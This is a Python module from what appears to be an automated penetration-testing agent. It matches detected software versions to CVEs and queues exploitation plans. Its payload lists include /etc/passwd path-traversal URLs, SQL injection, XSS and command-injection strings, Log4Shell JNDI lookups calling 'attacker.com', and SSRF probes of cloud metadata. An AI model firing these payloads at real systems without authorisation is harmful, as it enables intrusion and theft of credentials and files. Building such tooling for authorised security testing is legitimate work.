"""
CVE Auto-Integration - P7 Elite Enhancement
============================================

Automatically correlates fingerprinted technology versions with CVE databases
and queues exploitation hypotheses in the hypothesis ledger.

This module bridges the gap between:
1. Tech stack detection (identify_tech_stack)
2. CVE lookup (version_to_cves)
3. Hypothesis queueing (hypothesis_ledger.add)

WORKFLOW:
---------
identify_tech_stack() → auto_queue_cve_exploits() → hypothesis_ledger

When a technology version is fingerprinted (e.g., "Apache/2.4.49"), 
this module automatically:
1. Queries CVE databases for known vulnerabilities
2. Searches for available exploits
3. Prioritizes by severity and exploit availability
4. Queues hypotheses in the ledger for testing
5. Returns actionable exploitation plan

INTEGRATION POINTS:
-------------------
- Uses existing vuln_intel_actions.version_to_cves()
- Writes to hypothesis_ledger via hypothesis_actions.add_hypothesis()
- Enriches hypotheses with CVE metadata

Author: P7 Elite Enhancement
Version: 1.0.0
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from datetime import UTC, datetime
from typing import Any

from phantom.tools.registry import register_tool


logger = logging.getLogger(__name__)


# CVE-to-Attack Surface Mapping
# Maps CVE/CWE types to Phantom vulnerability classes
CVE_TO_VULN_CLASS_MAP = {
    "path traversal": "path_traversal",
    "directory traversal": "path_traversal",
    "arbitrary file read": "path_traversal",
    "sql injection": "sqli",
    "sqli": "sqli",
    "cross-site scripting": "xss",
    "xss": "xss",
    "reflected xss": "xss",
    "stored xss": "xss",
    "remote code execution": "rce",
    "rce": "rce",
    "command injection": "cmd_injection",
    "os command injection": "cmd_injection",
    "xxe": "xxe",
    "xml external entity": "xxe",
    "server-side template injection": "ssti",
    "ssti": "ssti",
    "authentication bypass": "auth_bypass",
    "authorization bypass": "authz_bypass",
    "csrf": "csrf",
    "cross-site request forgery": "csrf",
    "open redirect": "open_redirect",
    "ssrf": "ssrf",
    "server-side request forgery": "ssrf",
    "deserialization": "deserialization",
    "insecure deserialization": "deserialization",
    "file upload": "file_upload",
    "unrestricted file upload": "file_upload",
    "lfi": "lfi",
    "local file inclusion": "lfi",
    "rfi": "rfi",
    "remote file inclusion": "rfi",
    "idor": "idor",
    "insecure direct object reference": "idor",
}


@dataclass
class CVEExploitHypothesis:
    """Represents a CVE-based exploitation hypothesis."""
    
    cve_id: str
    product: str
    version: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    vuln_class: str  # Mapped to Phantom's vuln classes
    attack_surface: str  # URL or endpoint to target
    exploit_available: bool
    exploit_type: str | None = None  # metasploit, poc, manual
    exploit_url: str | None = None
    cvss_score: float | None = None
    confidence: str = "HIGH"  # HIGH (exploit available), MEDIUM (CVE only)
    recommended_payloads: list[str] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "cve_id": self.cve_id,
            "product": self.product,
            "version": self.version,
            "severity": self.severity,
            "description": self.description,
            "vuln_class": self.vuln_class,
            "attack_surface": self.attack_surface,
            "exploit_available": self.exploit_available,
            "exploit_type": self.exploit_type,
            "exploit_url": self.exploit_url,
            "cvss_score": self.cvss_score,
            "confidence": self.confidence,
            "recommended_payloads": self.recommended_payloads,
            "metadata": self.metadata,
        }


def _map_cve_to_vuln_class(cve_description: str) -> str:
    """
    Map CVE description to Phantom vulnerability class.
    
    Uses keyword matching against CVE_TO_VULN_CLASS_MAP.
    Falls back to 'rce' if no specific match found.
    
    Args:
        cve_description: CVE description text
        
    Returns:
        Vulnerability class (e.g., 'sqli', 'xss', 'path_traversal')
    """
    desc_lower = cve_description.lower()
    
    # Try exact matches first
    for keyword, vuln_class in CVE_TO_VULN_CLASS_MAP.items():
        if keyword in desc_lower:
            return vuln_class
    
    # Check for CWE patterns
    cwe_patterns = {
        "cwe-79": "xss",
        "cwe-89": "sqli",
        "cwe-78": "cmd_injection",
        "cwe-22": "path_traversal",
        "cwe-611": "xxe",
        "cwe-94": "rce",
        "cwe-434": "file_upload",
        "cwe-918": "ssrf",
        "cwe-502": "deserialization",
    }
    for cwe_id, vuln_class in cwe_patterns.items():
        if cwe_id in desc_lower:
            return vuln_class
    
    # Default to RCE if severity is CRITICAL/HIGH
    return "rce"


def _generate_attack_surfaces(
    product: str, 
    version: str, 
    base_url: str,
    vuln_class: str
) -> list[str]:
    """
    Generate potential attack surfaces based on product and vulnerability class.
    
    Args:
        product: Product name (e.g., 'apache', 'nginx')
        version: Version string
        base_url: Target base URL
        vuln_class: Vulnerability class
        
    Returns:
        List of attack surface URLs/paths to test
    """
    product_lower = product.lower()
    surfaces = []
    
    # Generic surfaces
    surfaces.append(f"{base_url}/")
    
    # Product-specific surfaces
    if "apache" in product_lower and vuln_class == "path_traversal":
        # CVE-2021-41773, CVE-2021-42013
        surfaces.extend([
            f"{base_url}/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            f"{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            f"{base_url}/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ])
    
    if "wordpress" in product_lower:
        surfaces.extend([
            f"{base_url}/wp-admin/",
            f"{base_url}/wp-login.php",
            f"{base_url}/wp-json/wp/v2/users",
            f"{base_url}/xmlrpc.php",
        ])
    
    if "drupal" in product_lower:
        surfaces.extend([
            f"{base_url}/user/login",
            f"{base_url}/?q=node&destination=node",
            f"{base_url}/admin",
        ])
    
    if "joomla" in product_lower:
        surfaces.extend([
            f"{base_url}/administrator/",
            f"{base_url}/administrator/index.php",
        ])
    
    if "nginx" in product_lower:
        surfaces.extend([
            f"{base_url}/../",
            f"{base_url}/..;/",
        ])
    
    if "tomcat" in product_lower or "java" in product_lower:
        surfaces.extend([
            f"{base_url}/manager/html",
            f"{base_url}/host-manager/html",
            f"{base_url}/examples/",
        ])
    
    if "jenkins" in product_lower:
        surfaces.extend([
            f"{base_url}/script",
            f"{base_url}/scriptText",
            f"{base_url}/asynchPeople/",
        ])
    
    if "gitlab" in product_lower:
        surfaces.extend([
            f"{base_url}/api/v4/users",
            f"{base_url}/api/graphql",
        ])
    
    if "spring" in product_lower and vuln_class == "rce":
        # Spring4Shell
        surfaces.append(f"{base_url}/")
    
    # Vuln-class-specific surfaces
    if vuln_class in ["sqli", "xss", "cmd_injection"]:
        surfaces.extend([
            f"{base_url}/search",
            f"{base_url}/login",
            f"{base_url}/api/search",
        ])
    
    return surfaces


def _generate_recommended_payloads(
    vuln_class: str,
    product: str,
    cve_description: str
) -> list[str]:
    """
    Generate recommended payloads based on CVE details.
    
    Args:
        vuln_class: Vulnerability class
        product: Product name
        cve_description: CVE description
        
    Returns:
        List of recommended payloads to try first
    """
    payloads = []
    desc_lower = cve_description.lower()
    
    if vuln_class == "path_traversal":
        payloads.extend([
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            ".%2e/.%2e/.%2e/.%2e/etc/passwd",
            "....//....//....//etc/passwd",
        ])
    
    if vuln_class == "sqli":
        payloads.extend([
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL,NULL,NULL--",
        ])
    
    if vuln_class == "xss":
        payloads.extend([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ])
    
    if vuln_class == "cmd_injection":
        payloads.extend([
            "; id",
            "| id",
            "` id `",
            "$( id )",
        ])
    
    if vuln_class == "rce":
        if "log4j" in desc_lower or "log4shell" in desc_lower:
            payloads.extend([
                "${jndi:ldap://attacker.com/a}",
                "${jndi:dns://attacker.com}",
            ])
        elif "spring" in product.lower() and "spring4shell" in desc_lower:
            payloads.append("class.module.classLoader.resources.context.parent.pipeline...")
        else:
            payloads.extend([
                "; whoami",
                "| whoami",
            ])
    
    if vuln_class == "ssrf":
        payloads.extend([
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:6379/",
            "file:///etc/passwd",
        ])
    
    return payloads


@register_tool(sandbox_execution=False)
async def auto_queue_cve_exploits(
    tech_stack: dict[str, Any],
    base_url: str,
    hypothesis_ledger: Any = None,
    min_severity: str = "MEDIUM",
    prioritize_exploits: bool = True,
    max_hypotheses: int = 20
) -> dict[str, Any]:
    """
    Automatically queue CVE-based exploitation hypotheses from fingerprinted tech stack.
    
    This is the MAIN FUNCTION that bridges tech detection → CVE lookup → hypothesis queueing.
    
    WORKFLOW:
    1. Parse tech_stack dictionary for products with versions
    2. Call version_to_cves() for each technology
    3. Map CVEs to vulnerability classes
    4. Generate attack surfaces based on product/CVE
    5. Queue hypotheses in hypothesis ledger
    6. Return prioritized exploitation plan
    
    Args:
        tech_stack: Tech stack dictionary from identify_tech_stack()
                   Format: {
                       "web_servers": [{"name": "Apache", "version": "2.4.49", "confidence": "high"}],
                       "languages": [{"name": "PHP", "version": "7.4.3"}],
                       "frameworks": [...],
                       ...
                   }
        base_url: Target base URL (e.g., "https://example.com")
        hypothesis_ledger: HypothesisLedger instance (optional, for direct integration)
        min_severity: Minimum CVE severity to queue (CRITICAL, HIGH, MEDIUM, LOW)
        prioritize_exploits: If True, prioritize CVEs with available exploits
        max_hypotheses: Maximum number of hypotheses to queue (prevents flooding)
        
    Returns:
        {
            "hypotheses_queued": 5,
            "cves_found": 12,
            "exploitation_plan": [
                {
                    "priority": 1,
                    "cve_id": "CVE-2021-41773",
                    "product": "Apache",
                    "severity": "CRITICAL",
                    "hypothesis_id": "H-0042",
                    "attack_surface": "https://example.com/cgi-bin/.%2e/.%2e/etc/passwd",
                    "exploit_available": true,
                    "recommended_action": "Test path traversal payloads immediately"
                },
                ...
            ],
            "summary": "Queued 5 high-priority CVE exploits for Apache/2.4.49",
            "status": "success"
        }
    
    Example:
        >>> tech_stack = {
        ...     "web_servers": [{"name": "Apache", "version": "2.4.49", "confidence": "high"}]
        ... }
        >>> result = auto_queue_cve_exploits(tech_stack, "https://example.com")
        >>> print(result["hypotheses_queued"])  # 3
    """
    try:
        # Import here to avoid circular dependencies
        from phantom.tools.vuln_intel.vuln_intel_actions import version_to_cves
        from phantom.tools.hypothesis.hypothesis_actions import add_hypothesis
        
        logger.info(f"[P7] Starting CVE auto-integration for {base_url}")
        
        # Severity ranking for filtering
        severity_rank = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
        min_severity_rank = severity_rank.get(min_severity.upper(), 2)
        
        all_hypotheses: list[CVEExploitHypothesis] = []
        cves_found = 0
        
        # Extract technologies with versions
        technologies = []
        for category in ["web_servers", "languages", "frameworks", "cms", "databases"]:
            if category in tech_stack:
                for tech in tech_stack[category]:
                    if isinstance(tech, dict) and "version" in tech and tech["version"]:
                        technologies.append({
                            "name": tech["name"],
                            "version": tech["version"],
                            "category": category
                        })
        
        logger.info(f"[P7] Found {len(technologies)} technologies with versions")
        
        # Query CVEs for each technology
        for tech in technologies:
            version_string = f"{tech['name']}/{tech['version']}"
            logger.info(f"[P7] Querying CVEs for {version_string}")
            
            try:
                cve_result = await version_to_cves(
                    version_string=version_string,
                    include_exploits=True
                )
                
                if cve_result.get("status") != "success":
                    logger.warning(f"[P7] CVE lookup failed for {version_string}")
                    continue
                
                cves = cve_result.get("cves", [])
                cves_found += len(cves)
                logger.info(f"[P7] Found {len(cves)} CVEs for {version_string}")
                
                # Process each CVE
                for cve in cves:
                    # Filter by severity
                    cve_severity = cve.get("severity", "MEDIUM").upper()
                    if severity_rank.get(cve_severity, 0) < min_severity_rank:
                        continue
                    
                    # Map to vulnerability class
                    description = cve.get("description", "")
                    vuln_class = _map_cve_to_vuln_class(description)
                    
                    # Check for exploits
                    exploits = cve.get("exploits", [])
                    exploit_available = len(exploits) > 0
                    exploit_type = None
                    exploit_url = None
                    
                    if exploit_available:
                        # Prioritize Metasploit exploits
                        metasploit = [e for e in exploits if "metasploit" in e.get("type", "").lower()]
                        if metasploit:
                            exploit_type = "metasploit"
                            exploit_url = metasploit[0].get("url")
                        else:
                            exploit_type = "poc"
                            exploit_url = exploits[0].get("url")
                    
                    # Generate attack surfaces
                    attack_surfaces = _generate_attack_surfaces(
                        product=tech["name"],
                        version=tech["version"],
                        base_url=base_url,
                        vuln_class=vuln_class
                    )
                    
                    # Generate recommended payloads
                    recommended_payloads = _generate_recommended_payloads(
                        vuln_class=vuln_class,
                        product=tech["name"],
                        cve_description=description
                    )
                    
                    # Create hypothesis for each attack surface
                    for surface in attack_surfaces[:3]:  # Limit to 3 surfaces per CVE
                        hypothesis = CVEExploitHypothesis(
                            cve_id=cve.get("cve_id", ""),
                            product=tech["name"],
                            version=tech["version"],
                            severity=cve_severity,
                            description=description,
                            vuln_class=vuln_class,
                            attack_surface=surface,
                            exploit_available=exploit_available,
                            exploit_type=exploit_type,
                            exploit_url=exploit_url,
                            cvss_score=cve.get("cvss_score"),
                            confidence="HIGH" if exploit_available else "MEDIUM",
                            recommended_payloads=recommended_payloads,
                            metadata={
                                "category": tech["category"],
                                "cve_data": cve,
                                "queued_at": datetime.now(UTC).isoformat()
                            }
                        )
                        all_hypotheses.append(hypothesis)
            
            except Exception as e:
                logger.error(f"[P7] Error processing CVEs for {version_string}: {e}")
                continue
        
        # Prioritize hypotheses
        def priority_score(h: CVEExploitHypothesis) -> tuple:
            """Calculate priority score (higher is better)."""
            severity_score = severity_rank.get(h.severity, 0)
            exploit_score = 10 if h.exploit_available else 0
            metasploit_bonus = 5 if h.exploit_type == "metasploit" else 0
            return (severity_score, exploit_score + metasploit_bonus, h.cvss_score or 0)
        
        all_hypotheses.sort(key=priority_score, reverse=True)
        
        # Queue top hypotheses
        exploitation_plan = []
        hypotheses_queued = 0
        
        for idx, hypothesis in enumerate(all_hypotheses[:max_hypotheses], 1):
            # Queue in hypothesis ledger if provided
            hypothesis_id = None
            if hypothesis_ledger:
                try:
                    hypothesis_id = hypothesis_ledger.add(
                        surface=hypothesis.attack_surface,
                        vuln_class=hypothesis.vuln_class
                    )
                    logger.info(f"[P7] Queued hypothesis {hypothesis_id}: {hypothesis.cve_id}")
                except Exception as e:
                    logger.error(f"[P7] Failed to queue hypothesis: {e}")
            else:
                # Fallback to add_hypothesis tool
                try:
                    hyp_result = add_hypothesis(
                        surface=hypothesis.attack_surface,
                        vuln_class=hypothesis.vuln_class
                    )
                    hypothesis_id = hyp_result.get("hypothesis_id")
                except Exception as e:
                    logger.error(f"[P7] Failed to call add_hypothesis: {e}")
            
            hypotheses_queued += 1
            
            # Build exploitation plan entry
            plan_entry = {
                "priority": idx,
                "cve_id": hypothesis.cve_id,
                "product": f"{hypothesis.product}/{hypothesis.version}",
                "severity": hypothesis.severity,
                "vuln_class": hypothesis.vuln_class,
                "hypothesis_id": hypothesis_id,
                "attack_surface": hypothesis.attack_surface,
                "exploit_available": hypothesis.exploit_available,
                "exploit_type": hypothesis.exploit_type,
                "exploit_url": hypothesis.exploit_url,
                "confidence": hypothesis.confidence,
                "recommended_payloads": hypothesis.recommended_payloads[:3],  # Top 3
                "recommended_action": _generate_action(hypothesis)
            }
            exploitation_plan.append(plan_entry)
        
        # Generate summary
        if hypotheses_queued == 0:
            summary = f"No CVEs found matching minimum severity {min_severity}"
            status = "no_cves_found"
        else:
            critical_count = sum(1 for h in all_hypotheses[:max_hypotheses] if h.severity == "CRITICAL")
            high_count = sum(1 for h in all_hypotheses[:max_hypotheses] if h.severity == "HIGH")
            summary = f"Queued {hypotheses_queued} CVE exploits: {critical_count} CRITICAL, {high_count} HIGH"
            status = "success"
        
        result = {
            "hypotheses_queued": hypotheses_queued,
            "cves_found": cves_found,
            "exploitation_plan": exploitation_plan,
            "summary": summary,
            "status": status,
            "metadata": {
                "technologies_scanned": len(technologies),
                "min_severity": min_severity,
                "prioritize_exploits": prioritize_exploits,
                "timestamp": datetime.now(UTC).isoformat()
            }
        }
        
        logger.info(f"[P7] CVE auto-integration complete: {summary}")
        return result
    
    except Exception as e:
        logger.error(f"[P7] CVE auto-integration failed: {e}", exc_info=True)
        return {
            "hypotheses_queued": 0,
            "cves_found": 0,
            "exploitation_plan": [],
            "summary": f"CVE auto-integration failed: {str(e)}",
            "status": "error",
            "error": str(e)
        }


def _generate_action(hypothesis: CVEExploitHypothesis) -> str:
    """Generate recommended action for hypothesis."""
    if hypothesis.exploit_available:
        if hypothesis.exploit_type == "metasploit":
            return f"Deploy Metasploit module immediately - {hypothesis.severity} severity RCE"
        else:
            return f"Test PoC exploit from {hypothesis.exploit_url} - {hypothesis.severity} severity"
    else:
        return f"Manual testing required for {hypothesis.vuln_class} - Review CVE {hypothesis.cve_id}"


@register_tool(sandbox_execution=False)
def enrich_hypothesis_with_cve(
    hypothesis_id: str,
    cve_id: str,
    hypothesis_ledger: Any = None
) -> dict[str, Any]:
    """
    Enrich an existing hypothesis with CVE metadata.
    
    Useful when CVEs are discovered AFTER hypothesis creation.
    
    Args:
        hypothesis_id: Hypothesis ID (e.g., "H-0042")
        cve_id: CVE identifier (e.g., "CVE-2021-41773")
        hypothesis_ledger: HypothesisLedger instance
        
    Returns:
        {
            "status": "success",
            "hypothesis_id": "H-0042",
            "cve_id": "CVE-2021-41773",
            "enriched_data": {...}
        }
    """
    try:
        from phantom.tools.vuln_intel.vuln_intel_actions import get_cve_details
        
        logger.info(f"[P7] Enriching hypothesis {hypothesis_id} with CVE {cve_id}")
        
        # Fetch CVE details
        cve_data = get_cve_details(cve_id=cve_id)
        
        if cve_data.get("status") != "success":
            return {
                "status": "error",
                "hypothesis_id": hypothesis_id,
                "cve_id": cve_id,
                "error": "Failed to fetch CVE details"
            }
        
        # Update hypothesis metadata (if ledger provided)
        if hypothesis_ledger:
            try:
                hyp = hypothesis_ledger._hypotheses.get(hypothesis_id)
                if hyp:
                    # Store CVE data in hypothesis
                    if not hasattr(hyp, "metadata"):
                        hyp.metadata = {}
                    hyp.metadata["cve_id"] = cve_id
                    hyp.metadata["cve_data"] = cve_data.get("cve_details", {})
                    hyp.metadata["enriched_at"] = datetime.now(UTC).isoformat()
            except Exception as e:
                logger.warning(f"[P7] Could not update hypothesis ledger: {e}")
        
        return {
            "status": "success",
            "hypothesis_id": hypothesis_id,
            "cve_id": cve_id,
            "enriched_data": cve_data.get("cve_details", {}),
            "summary": f"Hypothesis {hypothesis_id} enriched with {cve_id}"
        }
    
    except Exception as e:
        logger.error(f"[P7] Failed to enrich hypothesis: {e}")
        return {
            "status": "error",
            "hypothesis_id": hypothesis_id,
            "cve_id": cve_id,
            "error": str(e)
        }


@register_tool(sandbox_execution=False)
def get_cve_exploitation_status(
    cve_id: str,
    hypothesis_ledger: Any = None
) -> dict[str, Any]:
    """
    Check if a CVE has been tested and get exploitation status.
    
    Args:
        cve_id: CVE identifier
        hypothesis_ledger: HypothesisLedger instance
        
    Returns:
        {
            "cve_id": "CVE-2021-41773",
            "tested": true,
            "confirmed": true,
            "hypotheses": ["H-0042", "H-0043"],
            "status": "EXPLOITABLE"
        }
    """
    try:
        if not hypothesis_ledger:
            return {
                "cve_id": cve_id,
                "tested": False,
                "status": "UNKNOWN",
                "message": "No hypothesis ledger provided"
            }
        
        # Search for hypotheses with this CVE
        matching_hypotheses = []
        confirmed = False
        
        for hyp in hypothesis_ledger._hypotheses.values():
            metadata = getattr(hyp, "metadata", {})
            if metadata.get("cve_id") == cve_id:
                matching_hypotheses.append(hyp.id)
                if hyp.status == "confirmed":
                    confirmed = True
        
        if not matching_hypotheses:
            return {
                "cve_id": cve_id,
                "tested": False,
                "confirmed": False,
                "status": "NOT_TESTED",
                "hypotheses": []
            }
        
        status = "EXPLOITABLE" if confirmed else "TESTING_IN_PROGRESS"
        
        return {
            "cve_id": cve_id,
            "tested": True,
            "confirmed": confirmed,
            "hypotheses": matching_hypotheses,
            "status": status,
            "summary": f"{cve_id} is {status.lower().replace('_', ' ')}"
        }
    
    except Exception as e:
        logger.error(f"[P7] Failed to get CVE status: {e}")
        return {
            "cve_id": cve_id,
            "tested": False,
            "status": "ERROR",
            "error": str(e)
        }
